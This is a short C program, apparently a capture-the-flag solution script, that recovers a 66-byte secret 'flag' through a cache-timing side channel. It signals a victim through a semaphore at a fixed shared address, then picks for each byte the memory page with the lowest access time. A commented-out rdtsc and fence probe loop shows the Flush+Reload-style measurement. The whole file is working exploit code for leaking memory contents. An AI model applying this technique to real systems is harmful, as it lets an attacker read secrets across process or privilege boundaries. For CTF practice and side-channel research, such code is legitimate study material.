#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <semaphore.h>

char flag[0x100]= {0};

void mem(int index)
{
    unsigned long addr = 0x1337000;
    char *ptr = (char*)addr;
    sem_t *sem = (sem_t *)ptr;
    *(int *)(sem + 1) = index;


    sem_post(sem);

    sleep(1);
    unsigned long long start, finish, min_re = -1, re;
    char i_dont_care;
    //unsigned long long *time = (unsigned long long*)(ptr + 0x1000);

    for (int i = 0x4; i < 0x80; i++)
    {
        // _mm_mfence();
        // start = _rdtsc();
        // _mm_mfence();
        // i_dont_care = ptr[i * 0x1000];
        // _mm_mfence();
        // finish = _rdtsc();
        // _mm_mfence();
        // re = finish - start;
        // printf("find %d\tindex: %d\ttime: %llu\n", index, i, re);
        // if(re < min_re)
        // {
        //     min_re = re;
        //     flag[index] = i - 1;
        // }
        unsigned long long *time = (unsigned long long*)(&ptr[(i+1)*0x1000]);
        if(time[0] < min_re)
        {
            min_re = time[0];
            flag[index] = i;
        }
        printf("find: %d\tindex: %d\ttime: %llu\n", index, i, time[0]);
        
    }
    //putchar(flag[index]);


}

int main()
{
    for (int i = 0; i < 66; i++)
    {
        mem(i);
    }
    printf("%s\n", flag);
    printf("end\n");
    return 0;
}